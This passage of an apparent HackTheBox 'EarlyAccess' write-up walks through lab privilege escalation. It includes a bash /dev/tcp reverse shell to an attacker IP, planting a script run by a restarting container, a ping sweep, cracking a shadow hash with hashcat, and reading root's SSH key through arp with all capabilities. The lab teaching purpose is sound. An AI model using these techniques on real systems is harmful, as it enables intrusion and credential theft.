64e00fe6c62736c28ea1fe99b8c2ad5ed2f9b9/hosts","Id":"274eca4459e3a1d2f4b310cbe564e00fe6c62736c28ea1fe99b8c2ad5ed2f9b9","Image":"sha256:5c62e459e087e3bd3d963092b58e50ae2af881076b43c29e38e2b5db253e0287","LogPath":"/var/lib/docker/containers/274eca4459e3a1d2f4b310cbe564e00fe6c62736c28ea1fe99b8c2ad5ed2f9b9/274eca4459e3a1d2f4b310cbe564e00fe6c62736c28ea1fe99b8c2ad5ed2f9b9-json.log","MountLabel":"","Mounts":[{"Destination":"/docker-entrypoint-initdb.d","Mode":"ro","Propagation":"rprivate","RW":false,"Source":"/root/app/scripts/init.d","Type":"bind"},{"Destination":"/var/lib/mysql","Driver":"local","Mode":"rw","Name":"app_vol_mysql","Propagation":"","RW":true,"Source":"/var/lib/docker/volumes/app_vol_mysql/_data","Type":"volume"}],"Name":"/mysql","NetworkSettings":{"Bridge":"","EndpointID":"","Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"HairpinMode":false,"IPAddress":"","IPPrefixLen":0,"IPv6Gateway":"","LinkLocalIPv6Address":"","LinkLocalIPv6PrefixLen":0,"MacAddress":"","Networks":{"app_nw":{"Aliases":["274eca4459e3","mysql"],"DriverOpts":null,"EndpointID":"92ad34d6f3cf2a98e9746a04eecaefbb02936e981f9dbba8e54a67259d432f0f","Gateway":"172.18.0.1","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"IPAMConfig":{"IPv4Address":"172.18.0.100"},"IPAddress":"172.18.0.100","IPPrefixLen":16,"IPv6Gateway":"","Links":null,"MacAddress":"02:42:ac:12:00:64","NetworkID":"863e8188910c9fe9fd2bda1bf7d5f99ae1960bb20f30cd6b6ee296621e30b12f"}},"Ports":{"3306/tcp":null,"33060/tcp":null},"SandboxID":"6c6dfdc10b2a57012301cf75ca8c3033c76b69dab9f9c0d3797d8abe74d9cbfe","SandboxKey":"/var/run/docker/netns/6c6dfdc10b2a","SecondaryIPAddresses":null,"SecondaryIPv6Addresses":null},"Path":"docker-entrypoint.sh","Platform":"linux","ProcessLabel":"","ResolvConfPath":"/var/lib/docker/containers/274eca4459e3a1d2f4b310cbe564e00fe6c62736c28ea1fe99b8c2ad5ed2f9b9/resolv.conf","RestartCount":1,"State":{"Dead":false,"Error":"","ExitCode":0,"FinishedAt":"2021-08-18T21:51:51.405234669Z","Health":{"FailingStreak":0,"Log":[{"End":"2021-08-19T02:27:35.210359873+02:00","ExitCode":0,"Output":"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\nmysqld is alive\n","Start":"2021-08-19T02:27:35.113642753+02:00"},{"End":"2021-08-19T02:27:40.284708612+02:00","ExitCode":0,"Output":"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\nmysqld is alive\n","Start":"2021-08-19T02:27:40.213039501+02:00"},{"End":"2021-08-19T02:27:45.368978063+02:00","ExitCode":0,"Output":"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\nmysqld is alive\n","Start":"2021-08-19T02:27:45.287533139+02:00"},{"End":"2021-08-19T02:27:50.465612205+02:00","ExitCode":0,"Output":"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\nmysqld is alive\n","Start":"2021-08-19T02:27:50.37152404+02:00"},{"End":"2021-08-19T02:27:55.552044542+02:00","ExitCode":0,"Output":"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\nmysqld is alive\n","Start":"2021-08-19T02:27:55.467722261+02:00"}],"Status":"healthy"},"OOMKilled":false,"Paused":false,"Pid":41985,"Restarting":false,"Running":true,"StartedAt":"2021-08-18T21:53:35.5209803Z","Status":"running"}},"status":200}

```

I’ll copy that back to my VM and store it in a file, `checkdb` so that I can use `jq` to look at it with `cat checkdb | jq . | less`. The data was all the Docker information about the MySQL container. The `Env` section had the MySQL connection info, including username and password:

```

      "Env": [
        "MYSQL_DATABASE=db",
        "MYSQL_USER=drew",
        "MYSQL_PASSWORD=drew",
        "MYSQL_ROOT_PASSWORD=XeoNu86JTznxMCQuGHrGutF3Csq5",
        "SERVICE_TAGS=dev",
        "SERVICE_NAME=mysql",
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        "GOSU_VERSION=1.12",
        "MYSQL_MAJOR=8.0",
        "MYSQL_VERSION=8.0.25-1debian10"
      ],

```

### SSH

Before going to check the DB container, I tried the username and creds over SSH, and it worked:

```

oxdf@hacky$ sshpass -p XeoNu86JTznxMCQuGHrGutF3Csq5 ssh drew@earlyaccess.htb
...[snip]...
drew@earlyaccess:~$ 

```

And finally I have `user.txt`:

```

drew@earlyaccess:~$ cat user.txt
a6f5597d************************

```

## Shell as game-tester on game-server

### Enumeration

#### Mail

It would be easy to skip this part and just look at the next two bits of enumeration, but drew has a mail file in `/var/mail/drew`:

```

To: <drew@earlyaccess.htb>
Subject: Game-server crash fixes
From: game-adm <game-adm@earlyaccess.htb>
Date: Thu May 27 8:10:34 2021

Hi Drew!

Thanks again for taking the time to test this very early version of our newest project!
We have received your feedback and implemented a healthcheck that will automatically restart the game-server if it has crashed (sorry for the current instability of the game! We are working on it...) 
If the game hangs now, the server will restart and be available again after about a minute.

If you find any other problems, please don't hesitate to report them!

Thank you for your efforts!
Game-adm (and the entire EarlyAccess Studios team).

```

I’ll note the game-adm username, as well as the fact that the game has an automatic restart built in. That will come in handy later.

#### /opt

`/opt` is another one that would be easy to skip, but it’s useful to see here.

```

drew@earlyaccess:/opt$ ls -l
total 8
drwx--x--x 4 root root 4096 Jul 14 12:26 containerd
drwxrwxr-t 2 root drew 4096 Aug 19 03:15 docker-entrypoint.d

```

I can’t access `containerd`, but I can `docker-entrypoint.d`. It contains a single file named `node-server.sh`:

```

drew@earlyaccess:/opt$ ls docker-entrypoint.d/
node-server.sh

```

#### Homedir

Besides `user.txt`, there’s not much in drew’s homedir:

```

drew@earlyaccess:~$ ls -la
total 32
drwxr-xr-x 4 drew drew 4096 Aug 18 16:04 .
drwxr-xr-x 4 root root 4096 Jul 14 12:25 ..
lrwxrwxrwx 1 root root    9 Jul 14 12:25 .bash_history -> /dev/null
-rw-r--r-- 1 drew drew  220 May 24 13:09 .bash_logout
-rw-r--r-- 1 drew drew 3526 May 24 13:09 .bashrc
drwx------ 3 drew drew 4096 Aug 18 16:04 .gnupg
-rw-r--r-- 1 drew drew  807 May 24 13:09 .profile
drwxr-x--- 2 drew drew 4096 Jul 14 12:32 .ssh
-r-------- 1 drew drew   33 Jul 14 12:26 user.txt

```

The `.ssh` folder is interesting:

```

drew@earlyaccess:~/.ssh$ ls
id_rsa  id_rsa.pub  known_hosts

```

It has a key pair, but now `authorized_keys` file. That means that the keys are likely used somewhere else. The public key gives a hint:

```

drew@earlyaccess:~/.ssh$ cat id_rsa.pub 
ssh-rsa AAAAB3Nz...[snip]...vettGYr5lcS8w== game-tester@game-server

```

The user us `game-tester@game-server`.

There’s one other user on the box, game-adm, but the homedir is empty:

```

drew@earlyaccess:/home/game-adm$ ls -la
total 20
drwxr-xr-x 2 game-adm game-adm 4096 Jul 14 12:25 .
drwxr-xr-x 4 root     root     4096 Jul 14 12:25 ..
lrwxrwxrwx 1 root     root        9 Jul 14 12:25 .bash_history -> /dev/null
-rw-r--r-- 1 game-adm game-adm  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 game-adm game-adm 3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 game-adm game-adm  807 Apr 18  2019 .profile

```

#### Network

`ip addr` shows three potentially Docker-related IP addresses, 172.17.0.1, 172.18.0.1, and 172.19.0.1:

```

drew@earlyaccess:~/.ssh$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:3e:97 brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.110/23 brd 10.10.11.255 scope global ens160
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:48:7a:6d:f4 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-863e8188910c: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:05:3d:28:ab brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-863e8188910c
       valid_lft forever preferred_lft forever
5: br-ac3b4a426430: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:44:c0:ca:04 brd ff:ff:ff:ff:ff:ff
    inet 172.19.0.1/16 brd 172.19.255.255 scope global br-ac3b4a426430
       valid_lft forever preferred_lft forever
...[snip]...

```

My favorite instant ICMP sweep shows hosts in each subnet:

```

drew@earlyaccess:~/.ssh$ for i in {1..254}; do (ping -c 1 172.17.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 172.17.0.1: icmp_seq=1 ttl=64 time=0.083 ms
drew@earlyaccess:~/.ssh$ for i in {1..254}; do (ping -c 1 172.18.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 172.18.0.1: icmp_seq=1 ttl=64 time=0.037 ms
64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.054 ms
64 bytes from 172.18.0.100: icmp_seq=1 ttl=64 time=0.054 ms
64 bytes from 172.18.0.101: icmp_seq=1 ttl=64 time=0.048 ms
64 bytes from 172.18.0.102: icmp_seq=1 ttl=64 time=0.041 ms
drew@earlyaccess:~/.ssh$ for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.048 ms
64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.166 ms
64 bytes from 172.19.0.3: icmp_seq=1 ttl=64 time=0.090 ms

```

The potentially new hosts are 172.18.0.2, 172.19.0.2, and 172.19.0.3 (though they may be different on each boot).

### SSH

I tried to SSH to each of these servers, and 172.19.0.3 worked:

```

drew@earlyaccess:~/.ssh$ ssh game-tester@172.18.0.2
ssh: connect to host 172.18.0.2 port 22: Connection refused
drew@earlyaccess:~/.ssh$ ssh game-tester@172.19.0.2
ssh: connect to host 172.19.0.2 port 22: Connection refused
drew@earlyaccess:~/.ssh$ ssh game-tester@172.19.0.3
Linux game-server 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
...[snip]...
game-tester@game-server:~$

```

## Shell as root on game-server

### Enumeration

#### Homedirs

The game-tester homedir is very empty:

```

game-tester@game-server:~$ ls -la
total 40
drwxr-xr-x 1 game-tester game-tester 4096 Aug 19 00:53 .
drwxr-xr-x 1 root        root        4096 Jul 14 10:31 ..
-rw------- 1 game-tester game-tester    5 Aug 19 00:53 .bash_history
-rw-r--r-- 1 game-tester game-tester  220 May 15  2017 .bash_logout
-rw-r--r-- 1 game-tester game-tester 3526 May 15  2017 .bashrc
-rw-r--r-- 1 game-tester game-tester  675 May 15  2017 .profile
drwxr-xr-x 1 root        root        4096 Aug 18 14:24 .ssh

```

This container has two other users with home directories, but they are both very empty as well:

```

game-tester@game-server:/home$ ls
game-adm  game-tester  node
game-tester@game-server:/home$ ls -la node/
total 24
drwxr-xr-x 1 node 1000 4096 Jun 23 07:27 .
drwxr-xr-x 1 root root 4096 Jul 14 10:31 ..
-rw-r--r-- 1 node 1000  220 May 15  2017 .bash_logout
-rw-r--r-- 1 node 1000 3526 May 15  2017 .bashrc
-rw-r--r-- 1 node 1000  675 May 15  2017 .profile
game-tester@game-server:/home$ ls -la game-adm/
total 24
drwxr-xr-x 2 game-adm game-adm 4096 Jul 14 10:31 .
drwxr-xr-x 1 root     root     4096 Jul 14 10:31 ..
-rw-r--r-- 1 game-adm game-adm  220 May 15  2017 .bash_logout
-rw-r--r-- 1 game-adm game-adm 3526 May 15  2017 .bashrc
-rw-r--r-- 1 game-adm game-adm  675 May 15  2017 .profile

```

#### Docker

In the root of the filesystem, there’s an interesting Docker folder, and `entrypoint.sh`:

```

game-tester@game-server:/$ ls
bin  boot  dev  docker-entrypoint.d  entrypoint.sh  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var

```

`entrypoint.sh` will loop over the files in `docker-entrypoint.d`, run them in the background, and then `tail -f /dev/null`:

```

#!/bin/bash
for ep in /docker-entrypoint.d/*; do
if [ -x "${ep}" ]; then
    echo "Running: ${ep}"
    "${ep}" &
  fi
done
tail -f /dev/null

```

This last `tail` is a method for keeping the script from exiting, which leaves the container running.

There’s a single file in `docker-entrypoint.d`:

```

game-tester@game-server:/$ ls docker-entrypoint.d/
node-server.sh

```

It just starts `ssh`, installs dependencies with `node`, and then runs the server as the node user:

```

game-tester@game-server:/$ cat docker-entrypoint.d/node-server.sh 
service ssh start

cd /usr/src/app

# Install dependencies
npm install

sudo -u node node server.js

```

This looks very much like the same folder from the host in `/opt`.

I can’t write to this folder from in the container:

```

game-tester@game-server:/docker-entrypoint.d$ touch 0xdf.sh
touch: cannot touch '0xdf.sh': Permission denied

```

But I can from the host:

```

drew@earlyaccess:/opt/docker-entrypoint.d$ touch 0xdf.sh

```

And it’s there in the container:

```

game-tester@game-server:/docker-entrypoint.d$ ls
0xdf.sh  node-server.sh

```

This folder is cleared periodically.

#### Find Game

This is the game server, but the Mamba game from earlier was hosted on the webserver container. So what game is it talking about? Since it’s a server, I’ll see what it’s listening on:

```

game-tester@game-server:/docker-entrypoint.d$ ss -tnlp
State       Recv-Q Send-Q       Local Address:Port                      Peer Address:Port              
LISTEN      0      128                      *:9999                                 *:*                  
LISTEN      0      128                      *:22                                   *:*                  
LISTEN      0      128             127.0.0.11:33023                                *:*                  
LISTEN      0      128                     :::22                                  :::* 

```

22 is SSH, leaving 9999 and 33023. I couldn’t get anything useful out of 33023, but 9999 returns a webpage for the Rock v0.0.1 game:

```

game-tester@game-server:/$ curl 127.0.0.11:9999 
<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Rock v0.0.1</title>
    </head>
    <body>
        <div class="container">
            <div class="panel panel-default">
                <div class="panel-heading"><h1>Game version v0.0.1</h1></div>
                    <div class="panel-body">
                        <div class="card header">
                            <div class="card-header">
                                Test-environment for Game-dev
                            </div>
                            <div>
                                <h2>Choose option</h2>
                                <div>
                                    <a href="/autoplay"><img src="x" alt="autoplay"</a>
                                    <a href="/rock"><img src="x" alt="rock"></a> 
                                    <a href="/paper"><img src="x" alt="paper"></a>
                                    <a href="/scissors"><img src="x" alt="scissors"></a>
                                </div>
                                <h3>Result of last game:</h3>

                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </body>
</html>

```

#### Rock

I’ll reconnect with SSH as drew using `-L 9999:172.19.0.3:9999` to tunnel 9999 on my VM to Rock.

![image-20210818212611994](https://0xdfimages.gitlab.io/img/image-20210818212611994.png)

Clicking on “rock”, “paper”, or “scissors” results in the same page, with the results as win, lose, or tie:

![image-20210818212657778](https://0xdfimages.gitlab.io/img/image-20210818212657778.png)

“autoplay” produces a new form:

![image-20210818212714416](https://0xdfimages.gitlab.io/img/image-20210818212714416.png)

Clicking Start game produces results:

![image-20210818212734674](https://0xdfimages.gitlab.io/img/image-20210818212734674.png)

If I check the Verbose box, it gives the results for each round as well:

![image-20210818212757829](https://0xdfimages.gitlab.io/img/image-20210818212757829.png)

If I try to enter a large number of rounds, it complains:

![image-20210818212828929](https://0xdfimages.gitlab.io/img/image-20210818212828929.png)

If I send that request to Repeater in Burp and change it to something greater than 100, it returns a 500 Internal Service Error.

### Crash Server

#### Strategy

The strategy here is to abuse the fact that, as the email said, if the server hangs, it will restart. Given that the `docker-entrypoint.d` folder seems mapped into the container from the host, I’ll have my script in that folder and it will be run on restart.

#### POC

I’ll make sure my script is in the `docker-entrypoint.d` folder and executable:

```

drew@earlyaccess:/opt/docker-entrypoint.d$ echo -e '#!/bin/bash\n\ntouch /tmp/0xdf' > 0xdf.sh; chmod +x 0xdf.sh

```

Now, I’ll send the command with a negative number of rounds from Repeater:

```

POST /autoplay HTTP/1.1
Host: 127.0.0.1:9999
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Origin: http://127.0.0.1:9999
DNT: 1
Connection: close
Referer: http://127.0.0.1:9999/autoplay
Upgrade-Insecure-Requests: 1

rounds=-1&verbose=false

```

This request just hangs. After about 30 seconds, my SSH connection to the container dies:

```

game-tester@game-server:/docker-entrypoint.d$ Connection to 172.19.0.3 closed by remote host.
Connection to 172.19.0.3 closed.

```

I few seconds later, the host is back, and I can SSH back in to find `/tmp/0xdf` owned by root:

```

drew@earlyaccess:/opt/docker-entrypoint.d$ ssh game-tester@172.19.0.3
...[snip]...
game-tester@game-server:~$ ls -l /tmp/
total 4
-rw-r--r-- 1 root root    0 Aug 19 01:34 0xdf
drwxr-xr-x 3 root root 4096 Jul  7 17:26 v8-compile-cache-0

```

#### Shell

I’ll create a new payload that returns a reverse shell:

```

drew@earlyaccess:/opt/docker-entrypoint.d$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.6/443 0>&1' > 0xdf.sh; chmod +x 0xdf.sh

```

I’ll run it manually as game-tester to make sure it works, and I get a connection and shell back at a listening `nc`.

I’ll hang the game again, and wait for the SSH connection to die. Just after it does, I get a connection and a shell as root:

```

oxdf@hacky$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.110] 53652
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@game-server:/usr/src/app# 

```

## Shell as game-adm on EarlyAccess

### Enumeration

There’s not much new in the container that I gain access to as root vs as game-tester. But one of those is the `/etc/shadow` file. There’s only one user with a password hash in that file:

```

root@game-server:/etc# cat shadow | grep -F '$' 
game-adm:$6$zbRQg.JO7dBWcZ$DWEKGCPIilhzWjJ/N0WRp.FNArirqqzEMeHTaA8DAJjPdu8h52v0UZncJD8Df.0ncf6X2mjKYnH19RfGRneWX/:18822:0:99999:7:::

```

I’ll remember from above that game-adm is a user on the host as well.

### Crack Hash

This hash format is sha512crypt, which is relatively slow to break. Still, `hashcat` breaks it in 30 seconds with `rockyou.txt`:

```

$ hashcat -m 1800 shadow /usr/share/wordlists/rockyou.txt 
...[snip]...
$6$zbRQg.JO7dBWcZ$DWEKGCPIilhzWjJ/N0WRp.FNArirqqzEMeHTaA8DAJjPdu8h52v0UZncJD8Df.0ncf6X2mjKYnH19RfGRneWX/:gamemaster

```

### su

SSH doesn’t work for game-master with this password, but from the terminal as drew, `su game-adm` does work with the password “gamemaster”:

```

drew@earlyaccess:~$ su game-adm
Password: 
game-adm@earlyaccess:/home/drew$ 

```

## Shell as root on EarlyAccess

### Enumeration

With no `sudo` or obvious SUID binaries, I’ll check for files that game-adm can access that drew can’t. game-adm is in the adm group:

```

game-adm@earlyaccess:/$ id
uid=1001(game-adm) gid=1001(game-adm) groups=1001(game-adm),4(adm)

```

That provides access to log files as expected, but also the `arp` binary:

```

game-adm@earlyaccess:/tmp$ find / -group adm 2>/dev/null
/var/log/syslog.2.gz
/var/log/user.log.1
...[snip]...
/var/log/daemon.log.1
/var/log/syslog.3.gz
/usr/sbin/arp

```

On it’s face, there’s nothing special about `arp`:

```

game-adm@earlyaccess:/tmp$ ls -l /usr/sbin/arp
-rwxr-x--- 1 root adm 67512 Sep 24  2018 /usr/sbin/arp

```

But it does have capabilities set. `getcap` isn’t in the default path, but it is on the box:

```

game-adm@earlyaccess:/$ which getcap
game-adm@earlyaccess:/$ find / -name getcap 2>/dev/null
/usr/sbin/getcap
game-adm@earlyaccess:/$ /usr/sbin/getcap /usr/sbin/arp
/usr/bin/arp =ep

```

It has `=ep`, which is no specific capabilities, but rather *all* capabilities. From the [man page](https://man7.org/linux/man-pages/man3/cap_from_text.3.html):

> ```

> In the case that the leading operator is `=', and no list of
> capabilities is provided, the action-list is assumed to refer to
> `all' capabilities.  For example, the following three clauses are
> equivalent to each other (and indicate a completely empty
> capability set): "all="; "="; "cap_chown,<every-other-
> capability>=".
>
> ```

This setting would have also been identified by a script like [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS):

```

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
Current capabilities:
Current: =
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Files with capabilities (limited to 50):
/usr/sbin/arp =ep
/usr/bin/ping = cap_net_raw+ep

```

### File Read

[GTFOBins](https://gtfobins.github.io/gtfobins/arp/) has a page on `arp` that shows how it can be abused to read files. While there’s no specific section on capabilities, having all of them is basically running as root.

I can use this to read the flag:

```

game-adm@earlyaccess:/$ /usr/sbin/arp -v -f /root/root.txt
>> 7bf864a4************************
arp: format error on line 1 of etherfile /root/root.txt !

```

I could also read the `/etc/shadow` file and try to crack the password, but there’s also an SSH key in `/root/.ssh`:

```

game-adm@earlyaccess:/$ /usr/sbin/arp -v -f /root/.ssh/id_rsa | head     
>> -----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN: Unknown host
arp: cannot set entry on line 1 of etherfile /root/.ssh/id_rsa !
>> b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
arp: format error on line 2 of etherfile /root/.ssh/id_rsa ! 
>> NhAAAAAwEAAQAAAQEArIOXIvZx/5LspJVtY/Y5eT3B0g+hf1t4NEwLljBNrVzW3Y1JFDTL
arp: format error on line 3 of etherfile /root/.ssh/id_rsa ! 
>> bsqeX+jY1B0lLH361DrhTMra1KSHtTtk+Y6FLqUaYOnlxPlEnaldg/F9c+ch6bzgvEoYai
arp: format error on line 4 of etherfile /root/.ssh/id_rsa !
...[snip]...

```

The formatting is a bit messed up, but it can be cleaned, or I can do it in one line, redirecting the errors to stdout, using `grep` to select the lines with the key, and then `cut` to remove the `>>` :

```

game-adm@earlyaccess:/$ /usr/sbin/arp -v -f /root/.ssh/id_rsa 2>&1 | grep ">>" | cut -d ' ' -f2-
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEArIOXIvZx/5LspJVtY/Y5eT3B0g+hf1t4NEwLljBNrVzW3Y1JFDTL
bsqeX+jY1B0lLH361DrhTMra1KSHtTtk+Y6FLqUaYOnlxPlEnaldg/F9c+ch6bzgvEoYai
Z/GLfnkdrY9mmU3wrCi4c7OIe1YOwPPtNLYJb76qg7dVrj9beJjT+ZRG7JflgS/aQtFUVe
9NkES/xNk80E4q1Ypbodj8pJcyWek9LXC5/+sdhV4KnUHZjoNZ+BlcpKsYvC0K1we02oC7
3p05jrBZXYwCgzPTy/8DZ9FZr6oSBleQR8lPl6xPo6D32gcHRvVJCSakvVcjJWH2L227+3
6g4RguqXGwAAA8ihamwioWpsIgAAAAdzc2gtcnNhAAABAQCsg5ci9nH/kuyklW1j9jl5Pc
HSD6F/W3g0TAuWME2tXNbdjUkUNMtuyp5f6NjUHSUsffrUOuFMytrUpIe1O2T5joUupRpg
6eXE+USdqV2D8X1z5yHpvOC8ShhqJn8Yt+eR2tj2aZTfCsKLhzs4h7Vg7A8+00tglvvqqD
t1WuP1t4mNP5lEbsl+WBL9pC0VRV702QRL/E2TzQTirViluh2PyklzJZ6T0tcLn/6x2FXg
qdQdmOg1n4GVykqxi8LQrXB7TagLvenTmOsFldjAKDM9PL/wNn0VmvqhIGV5BHyU+XrE+j
...[snip]...

```

### SSH

With the key, I can get a shell as root:

```

oxdf@hacky$ ssh -i ~/keys/earlyaccess-root root@earlyaccess.htb
...[snip]...
root@earlyaccess:~#

```

## Beyond Root

### Magic Number Leak

It’s possible to leak the magic number used in the key algorithm. This unintended was known to the author, who decided to leave it in because it didn’t skip much, and is clever.

As admin on the site, there’s debug output when verifying a key. For example, if the key isn’t the right length:

![image-20220208191956525](https://0xdfimages.gitlab.io/img/image-20220208191956525.png)

If I enter `/` as the key, it returns:

![image-20220208192026435](https://0xdfimages.gitlab.io/img/image-20220208192026435.png)

That implies there’s some kind of request going on in the back end.

Entering `../` gives even more interesting results:

> **Error**
>
> Game-key is invalid! DEBUG: Welcome to the game-key verification API! You can verify your keys via: /verify/. If you are using manual verification, you have to synchronize the magic\_num here. Admin users can verify the database using /check\_db.

This is the [API](#source-code). At a later step in the box, I’ll use the `/check_db` with auth to leak keys, but I can’t do that now. There is a file with the current `magic_num`. Entering `../magic_num` returns it:

> **Error**
>
> Game-key is invalid! DEBUG: magic\_num: 380

Leaking this would allow me to skip the brute force and just calculate a working key.

### Admin Name Abuse [Patched]

On the day after release, the [box was patched](https://app.hackthebox.com/machines/EarlyAccess/changelog) to prevent an unintended path that was identified.

EarlyAccess was designed so that the admin account can’t register a key (has the verify option instead), but the author wanted to still give the admin access to the game. Therefore, on logging in to the game site, there was the following code:

```

if ($name == "admin" || $key != "")
{
    // Store id & username in session
    $_SESSION['user'] = array();
    $_SESSION['user']['id'] = $id;
    $_SESSION['user']['name'] = $name;
    header('Location: /game.php');
}
else // No game-key registered
{
    throw new Exception("The account has no EarlyAccess-Key linked! Please link your game key to your account to continue.");
}

```

The problem is that the `$name` is easily changed by the user, and not forced to be unique in the DB. This allowed for users to register, and then change the name to “admin” and gain access to the game site, skipping the XSS to get the admin cookie and the token calculation / brute force. HTB and the author patched this by not allowing the admin to play the game at all. There’s also some checks blocking registering the name admin.